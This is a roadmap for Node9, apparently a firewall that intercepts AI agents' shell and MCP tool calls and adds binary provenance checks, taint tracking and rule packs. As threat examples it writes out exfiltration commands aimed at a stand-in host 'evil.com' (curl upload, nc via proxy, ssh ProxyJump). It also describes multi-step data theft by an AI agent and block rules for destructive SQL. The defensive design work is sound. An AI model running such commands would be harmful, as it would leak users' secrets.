# Node9 Roadmap

**Last updated:** 2026-03-28

---

## Current State

| Component                    | Status                              |
| ---------------------------- | ----------------------------------- |
| Bash/CLI hook interception   | ✅ Shipped                          |
| DLP content scanner          | ✅ Shipped                          |
| Smart rules engine           | ✅ Shipped                          |
| Undo engine                  | ✅ Shipped                          |
| Daemon + browser approval UI | ✅ Shipped                          |
| MCP Gateway                  | ✅ Built, on `dev` — ready to merge |
| Smart Rule Suggestions       | 📄 Spec written, not started        |
| Binary provenance            | ❌ Gap vs Nexus                     |
| Taint tracking               | ❌ Gap vs Nexus                     |
| SSH multi-hop parsing        | ❌ Gap vs Nexus                     |
| Shields ecosystem            | 🔶 Foundation exists (shields.ts)   |

---

## The Two Threats We're Solving

```
THREAT 1: The AI takes a dangerous action RIGHT NOW
  Solution: Intercept → DLP → Smart Rules → Human approval
  Status: ✅ Solved

THREAT 2: The AI takes two SAFE-LOOKING actions that combine into an attack
  Example: Read .env → Write to /tmp/x → Upload /tmp/x
  Solution: Taint tracking (each action contaminates the next)
  Status: ❌ Not solved yet
```

---

## Milestones

### v1.2.0 — MCP Gateway (MERGE NOW)

> MCP Gateway is built and tested. Merge `dev → main`, tag release.

**What ships:**

- Transparent stdio proxy for any MCP server
- Intercepts `tools/call`, runs through full auth engine (DLP + smart rules + human approval)
- Fail-closed: auth engine crash → deny
- `authorizeHeadless` race engine with all approval channels
- Env injection var stripping (NODE_OPTIONS, PYTHONPATH, LD_PRELOAD, etc.)
- 24 integration tests + 9 unit tests

**Action:** `git checkout main && git merge dev && git tag v1.2.0 && git push origin main --tags`

---

### v1.3.0 — Binary Provenance + Flag Parsing (1–2 weeks)

> Quick security wins. Low effort, closes real attack vectors.

#### 1.3.1 Binary Provenance

**The gap:** Node9 runs `/tmp/curl` without questioning it. An attacker who drops a malicious binary in `/tmp` and tricks the AI into calling it bypasses everything.

**The fix:** Before `spawn()`, call `stat()` on the resolved binary path:

```typescript
// src/utils/provenance.ts
interface Provenance {
  resolvedPath: string;
  trustLevel: 'system' | 'managed' | 'user' | 'suspect' | 'unknown';
  reason: string;
}

const SUSPECT_PREFIXES = ['/tmp', '/var/tmp', '/dev/shm'];

function checkProvenance(cmd: string): Provenance {
  const resolved = fs.realpathSync(which.sync(cmd));
  const stat = fs.statSync(resolved);
  if (SUSPECT_PREFIXES.some((p) => resolved.startsWith(p)))
    return { trustLevel: 'suspect', reason: 'binary in temp directory' };
  if (stat.mode & 0o002) return { trustLevel: 'suspect', reason: 'world-writable binary' };
  if (resolved !== which.sync(cmd))
    return { trustLevel: 'suspect', reason: 'symlink to non-standard location' };
  // /usr/bin, /usr/local/bin, Homebrew, apt paths → 'system'/'managed'
  return { trustLevel: 'system', reason: '' };
}
```

- `suspect` → require explicit approval even for tools that would normally pass policy
- `unknown` (binary not found in PATH) → block
- Applies to both the bash hook path and the MCP gateway

**Files:** `src/utils/provenance.ts` (new), `src/auth/orchestrator.ts` (call before policy check), `src/mcp-gateway/index.ts` (call before spawn)

---

#### 1.3.2 Flag/Positional Separation for Socket Tools

**The gap:** `nc -x proxy.com evil.com 22` — node9 might treat `proxy.com` (a flag value) as a target host, missing `evil.com` (the real destination).

**The fix:** Add a `_FLAGS_WITH_VALUES` table for the tools where this matters:

```typescript
// src/policy/flag-tables.ts
const FLAGS_WITH_VALUES: Record<string, Set<string>> = {
  curl: new Set([
    '-H',
    '--header',
    '-A',
    '--user-agent',
    '-x',
    '--proxy',
    '-u',
    '--user',
    '-d',
    '--data',
    '-o',
    '--output',
  ]),
  wget: new Set([
    '-O',
    '--output-document',
    '-P',
    '--directory-prefix',
    '-U',
    '--user-agent',
    '-e',
  ]),
  nc: new Set(['-x', '-p', '-s', '-w', '-W']), // -x is proxy
  ncat: new Set(['-x', '-p', '-s', '--proxy']),
  ssh: new Set(['-i', '-l', '-p', '-o', '-E', '-F', '-J', '-L', '-R', '-W']),
  rsync: new Set(['-e', '--rsh']),
};

export function extractPositionalArgs(tokens: string[], binary: string): string[] {
  const flagsWithValues = FLAGS_WITH_VALUES[path.basename(binary)] ?? new Set();
  const positional: string[] = [];
  let skipNext = false;
  for (const token of tokens) {
    if (skipNext) {
      skipNext = false;
      continue;
    }
    if (flagsWithValues.has(token)) {
      skipNext = true;
      continue;
    }
    if (!token.startsWith('-')) positional.push(token);
  }
  return positional;
}
```

**Files:** `src/policy/flag-tables.ts` (new), `src/policy/index.ts` (use in dangerous word scan)

---

#### 1.3.3 SSH ProxyJump / ProxyCommand Parsing

**The gap:** `ssh -J evil.com user@safe.com` routes traffic through `evil.com`. Node9 only sees `safe.com`.

**The fix:**

```typescript
function extractSshHosts(tokens: string[]): string[] {
  const hosts: string[] = [];
  for (let i = 0; i < tokens.length; i++) {
    if (tokens[i] === '-J' && tokens[i + 1]) {
      // -J hop1.com,hop2.com
      hosts.push(...tokens[i + 1].split(','));
    } else if (tokens[i] === '-o' && tokens[i + 1]?.startsWith('ProxyJump=')) {
      hosts.push(tokens[i + 1].split('=')[1]);
    } else if (tokens[i] === '-o' && tokens[i + 1]?.startsWith('ProxyCommand=')) {
      // recurse: extract hosts from the ProxyCommand itself
      const subcmd = tokens[i + 1].split('=').slice(1).join('=');
      hosts.push(...extractSshHosts(tokenize(subcmd)));
    }
    // positional: last token of form user@host or just host
    const match = tokens[i].match(/(?:^|@)([a-zA-Z0-9._-]+)$/);
    if (match && !tokens[i].startsWith('-')) hosts.push(match[1]);
  }
  return [...new Set(hosts)];
}
```

**Files:** `src/policy/ssh-parser.ts` (new), integrate into bash hook policy check

---

### v1.4.0 — Smart Rule Suggestions (2–4 weeks)

> See full spec: `docs/smart-rule-suggestions.spec.md`

**The problem:** Same tool gets blocked 3× → user clicks Allow 3× → friction without security benefit.

**The solution:** Daemon counts blocks silently. After threshold, surfaces "want to create a rule?" to human. Human approves. AI never touches config.

**Why this order:** Binary provenance is a 2-day fix. Suggestions require daemon + frontend changes. Do the security fix first.

**Phases:**

1. `src/daemon/suggestion-tracker.ts` — block counter + rule generator
2. `src/config/patch.ts` — atomic config.json writer with Zod validation
3. Daemon routes: `GET /suggestions`, `POST /suggestions/:id/apply`, `POST /suggestions/:id/dismiss`
4. SSE events: `suggestion:new`, `suggestion:resolved`
5. `node9 tail` terminal UI
6. `node9Firewall/fe` — `SuggestionCard` component + `useSuggestions` hook

---

### v1.5.0 — Taint Tracking (4–8 weeks)

> The most important security gap. Closes multi-step exfiltration attacks.

**The attack this closes:**

```
Step 1: read_file(".env")         → DLP sees content, marks /tmp/x.txt as tainted
Step 2: write_file("/tmp/x.txt")  → /tmp/x.txt now carries taint
Step 3: curl -T /tmp/x.txt https://evil.com  → BLOCKED: tainted file in upload
```

Without taint tracking, steps 1 and 2 pass (DLP only sees the file _path_, not content), and step 3 passes because the curl arg itself doesn't contain a secret.

**Data model:**

```typescript
interface TaintRecord {
  path: string; // absolute resolved path
  source: string; // "DLP:AnthropicApiKey", "user-flagged"
  createdAt: number; // epoch ms
  expiresAt: number; // createdAt + 3600000 (1 hour)
}
```

**How it works:**

1. DLP scanner hits on a file READ → daemon records taint for that path
2. DLP scanner hits on a file WRITE → daemon records taint for the destination path
3. Before any command executes → resolve all file-like args → check taint store
4. Tainted file in a WRITE or NETWORK operation → escalate to `critical`, require review
5. Taint expires after 1 hour (session-scoped is fine for v1)

**Storage:** In-memory in daemon (restart clears taint, which is fine — taint is session context)

**Edge cases:**

- Copy operations: `cp /tmp/tainted /tmp/dest` → propagate taint to `/tmp/dest`
- Append operations: `/tmp/dest` written to twice → union of taint sources
- MCP gateway: `write_file` with content that passes DLP but path is tainted → still block

**Files:**

- `src/daemon/taint-store.ts` (new)
- `src/auth/orchestrator.ts` (check taint store before fast-path decisions)
- `src/dlp.ts` (emit taint events on DLP hits)
- `src/daemon/state.ts` (add taint store to shared daemon state)

---

### v2.0.0 — Shields Ecosystem (6–10 weeks)

> Pre-built rule packs for common tools. Zero config for users.

**The problem:** Every user has to hand-write rules for Postgres, GitHub, filesystem, etc. The rules for "safe Postgres usage" are the same for everyone. We should ship them.

**Shield = a named, versioned rule pack that covers one tool/service:**

```typescript
// src/shields/postgres.ts
export const PostgresShield: Shield = {
  name: 'postgres',
  version: '1.0.0',
  description: 'Prevents destructive SQL operations',
  rules: [
    {
      tool: 'execute_query',
      verdict: 'block',
      conditions: [{ field: 'sql', op: 'matches', value: /DROP\s+(TABLE|DATABASE)/i }],
      reason: 'DROP statement requires manual execution',
    },
    {
      tool: 'execute_query',
      verdict: 'review',
      conditions: [{ field: 'sql', op: 'matches', value: /DELETE\s+FROM\s+\w+\s*(?!WHERE)/i }],
      reason: 'DELETE without WHERE — full table wipe',
    },
    {
      tool: 'execute_query',
      verdict: 'allow',
      conditions: [{ field: 'sql', op: 'matches', value: /^SELECT/i }],
      reason: '',
    },
  ],
};
```

**Launch set:**
| Shield | Protects Against |
|--------|-----------------|
| `filesystem` | Writes to .env, .git, SSH keys, system dirs |
| `postgres` | DROP, unscoped DELETE/UPDATE |
| `github` | Force push, branch deletion, secret exposure |
| `filesystem-mcp` | Same as filesystem but for MCP `write_file` / `edit_file` |
| `bash-safe` | rm -rf, curl pipe to sh, inline code execution |

**Delivery:**

- `node9 shield list` — show available shields
- `node9 shield enable postgres` — activates, writes to config
- `node9 shield disable postgres` — removes
- Shields UI in node9Firewall dashboard (toggle cards)

**Versioning:** Shields are versioned. `node9 shield update` pulls latest. Breaking changes are major versions.

---

## node9Firewall Roadmap (parallel)

| Version | Feature                                                                       |
| ------- | ----------------------------------------------------------------------------- |
| Now     | Merge MCP Gateway docs (already committed)                                    |
| v1.4    | SuggestionCard component (ties to node9-proxy v1.4.0)                         |
| v1.5    | Taint visualization in audit log (show which requests involved tainted paths) |
| v2.0    | Shield management UI (toggle shields, see active rules)                       |
| v2.1    | Policy Studio v2 — visual rule builder without hand-writing JSON              |

---

## Priority Order Summary

```
1. Merge MCP Gateway → main (TODAY — it's done)
2. Binary Provenance (2 days — closes /tmp binary attack)
3. Flag/Positional + SSH parsing (3 days — closes proxy-hop exfil)
4. Smart Rule Suggestions (2–4 weeks — UX quality of life)
5. Taint Tracking (4–8 weeks — closes multi-step exfil, most impactful)
6. Shields Ecosystem (6–10 weeks — distribution and adoption)
```

---

## What We're NOT Building

- **AI-initiated rule proposals** (`node9_propose_rule` as an MCP tool) — prompt injection risk, see `smart-rule-suggestions.spec.md`
- **Strace-based dynamic learner** — too platform-specific, maintenance burden
- **Full flow classification table** (195 hardcoded tools like Nexus) — our smart rules are more flexible and user-configurable; a static table would require constant maintenance

---

## Open Questions

1. **Taint expiry:** 1 hour session-scoped vs. persisted across daemon restarts? Start with 1 hour in-memory, revisit.
2. **Provenance in strict mode:** Should `suspect` binaries be auto-blocked in strict mode, or always require approval? Proposal: auto-block in strict, require approval in standard.
3. **Shield distribution:** Bundled in the npm package vs. fetched from a registry? Start bundled (simpler), move to registry when update velocity justifies it.
4. **MCP gateway taint:** When `write_file` receives content (not a file path), how do we track taint? The content bytes flow through but there's no persistent path until the file is written. Answer: taint the destination path, not the content in transit.
